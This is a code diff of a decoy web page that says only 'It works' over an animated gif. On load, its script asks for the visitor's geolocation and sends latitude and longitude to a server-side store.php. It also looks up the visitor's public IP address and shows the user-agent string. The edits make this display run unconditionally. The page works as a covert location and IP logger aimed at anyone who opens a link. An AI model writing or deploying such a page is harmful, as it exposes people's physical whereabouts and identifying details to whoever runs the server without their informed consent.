@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Smart</title>
     <style>
         body{
             min-height: 95vh;
@@ -19,6 +19,7 @@
           justify-content: center;
           width: 100%;
           min-height: 90vh;
+          flex-direction: column;
         }
         img{
             box-shadow:  0px 0px 5px wheat;
@@ -30,14 +31,18 @@
           color: white;
           font-size: 18px;
         }
+        p{
+          color: #eee;
+        }
     </style>
 </head>
 <body style="background-color: #111;" onload="getLocation()" id="body">
   <div class="countener">
-    <img src="./giphy.gif" alt="">
+    <img src="./giphy.gif">
       <h1 id="h1" style="color: #aaa;text-shadow: 0 0 5px wheat;">
           It works
       </h1>
+      <p></p>
   </div>  
     <a href="www.google.com" style="display: none;" id="clicker">google</a>
     <!-- <script>
@@ -56,22 +61,22 @@
             x.innerHTML = "Geolocation is not supported by this browser.";
           }
         }
-        
         function showPosition(position) {
           const xhttp = new XMLHttpRequest();
           xhttp.open("GET","store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
           xhttp.send();
           console.log(xhttp.readyState);
-          if (xhttp.readyState == 4 && xhttp.status == 200){
-            fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => document.getElementById("h1").innerHTML += "<br>IP : " + data.ip);
+          fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => document.getElementById("h1").innerHTML += "<br>IP : " + data.ip);
+          x.innerHTML = "Latitude: " + position.coords.latitude + 
+          "<br>Longitude: " + position.coords.longitude;
+          var link = "https://www.latlong.net/c/?lat="+ position.coords.latitude + "&long=" + position.coords.longitude;
+          document.querySelector(".countener").innerHTML += `<a href="${link}" target="_blank">clickmy</a>`
+          document.querySelector("p").innerHTML = navigator.userAgent;
+          // if (xhttp.readyState == 4 && xhttp.status == 200){
             
-            x.innerHTML = "Latitude: " + position.coords.latitude + 
-            "<br>Longitude: " + position.coords.longitude;
-            var link = "https://www.latlong.net/c/?lat="+position.coords.latitude+"&long="+position.coords.longitude;
-            document.querySelector(".countener").innerHTML += `<a href="${link}" target="_blank">clickmy</a>`
-          }
+          // }
         }
         </script>
 </body>
